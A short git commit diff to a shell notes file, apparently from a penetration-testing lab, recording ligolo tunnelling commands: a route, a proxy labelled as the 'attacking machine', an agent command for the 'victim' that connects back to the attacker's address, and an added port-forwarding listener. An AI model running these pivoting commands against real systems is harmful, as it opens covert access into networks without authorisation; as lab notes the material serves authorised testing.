240a81397e55e778620182a7244458f7546e7ddd
0xhanu58 <0xhanu58@proton.me>
2025-02-28 15:40:50 +0530

    Update ligolo-setup.sh

--- ligolo-setup.sh
+++ ligolo-setup.sh
@@ -6,3 +6,6 @@ sudo ip route add 10.10.69.0/24 dev ligolo
 sudo ./proxy -selfcert -laddr 0.0.0.0:443 # attacking machine
 
 .\agent -connect 10.10.14.22:443 -ignore-cert # victim
+
+# local port to agent
+listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:800
